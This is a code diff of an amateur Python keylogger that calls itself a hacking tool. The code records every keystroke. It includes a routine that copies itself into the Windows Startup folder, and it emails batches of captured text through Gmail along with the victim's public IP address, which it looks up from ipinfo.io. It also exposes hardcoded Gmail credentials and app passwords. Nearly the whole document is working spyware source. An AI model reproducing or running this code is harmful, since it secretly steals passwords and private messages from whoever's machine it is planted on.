@@ -1,10 +1,3 @@
-#version keylogger.py 1.3.6////hacking tool\\\\\\\\\
-print("keylogger version###############1.3.6##################")
-#[3-17] i was trying to import some modules and if one of those modules is not found with the help of internet connection we can dowload the modules
-
-
-
-
 try:
   import shutil
   import os 
@@ -12,7 +5,9 @@ try:
   import smtplib, ssl
   import socket
   from email.message import EmailMessage
-  import schedule
+  import threading
+  import requests
+  import json
 
 
 
@@ -23,9 +18,10 @@ except ModuleNotFoundError:
         call("python -m pip install " + module)
         print(f"{module} installed.....")
 
-#the next function is created to move this python file to startup file {you can see the startup folder by (windows + R) then type shell:startup}
-
-
+"""
+   this is a function that will upload this keylogger.py file into the startup file to make this a really 
+   functional keylogger but right now it is just very basic and only works in windows PC
+"""
 def move_file_to_startapp():
     main_destination = ['Hp', 'hp', 'user', 'lenovo', 'dell']
     current_dir = os.getcwd()
@@ -36,40 +32,63 @@ def move_file_to_startapp():
             path = destination
     shutil.copy2(path_of_python_file, rf"C:\\Users\\{path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
     print("line 19: new_directory =",current_dir)
-move_file_to_startapp()
+
+
 substitute = open(r"C:\\Users\\Hp\\Desktop\\no.txt", "w")
 
 
-#the next function is created to send email that contains what the user types to the main mail and also it uses the socket function because it send the user ip address as the subject using the smtplib module
+"""
+   This function allows us to get the public ip address of this computer from ipinfo website
+   NB:- this only works when wifi is on
+  
+"""
+def get():
+        public_ip_address = None
+        try:
+            endpoint = 'https://ipinfo.io/json'
+            response = requests.get(endpoint, verify = True)
 
+            if response.status_code != 200:
+                print('Status:', response.status_code, 'Problem with the request. Exiting.')
+                exit()
 
+            data = response.json()
+
+            public_ip_address = data['ip']
+
+           
+        except:
+            print("i think there is an error nati......")
+
+        return public_ip_address
+
+       
+#this function is used to send email with the public ip address as the Subject of the email
 def sendmail(user_message, timeout=1):
     global substitute
-    try:
-        host = socket.gethostname()
-        ip = socket.gethostbyname(host)
-        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
-        sender_email = "trialnatiemail@gmail.com"
-        server.login(sender_email, "stipsgzhbjyonvle")
-        msg = EmailMessage()
-        msg['Subject'] = f'from {ip} '
-        msg['From'] = sender_email
-        msg['To'] = sender_email
-        msg.set_content(user_message)
-        server.send_message(msg)
-    except:
-        print("line 45: email cannot be send because there was some sort of error....")
-        substitute.write(word)
+    
+    host = socket.gethostname()
+    ip = socket.gethostbyname(host)
+    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
+    sender_email = "trialnatiemail@gmail.com"
+    email_password = "updl ryrd geon tdfx"
+    server.login(sender_email, email_password)
+    msg = EmailMessage()
+    msg['Subject'] = get()
+    msg['From'] = sender_email
+    msg['To'] = sender_email
+    msg.set_content(user_message)
+    server.send_message(msg)
+    print("Email was sent succesfully....")
+   
 
-
+get()
 word = " "
-#this is the function that records the pressed keys 
 
-
+#on_press function allows us to record the keystrokes and print this functions on the terminal
 def on_press(key):
     global word
     global substitute
-#this are the conditionals that helps to make anything you want using the 
     if (key == Key.space) or key == Key.enter:
         word += ' '
     elif key == Key.backspace:
@@ -80,9 +99,11 @@ def on_press(key):
         char = f'{key}'
         char = char[1:-1]
         word += char
-    print("{0} pressed".format(key))
+    print(f"{key} pressed")
     if len(word) % 100 == 0:
-        sendmail(word) 
+        thread1 = threading.Thread(target=sendmail, args=[word])
+        thread1.start()
 
+#Here we are recording all of the keystrokes 
 with Listener(on_press=on_press) as listener:
  listener.join()
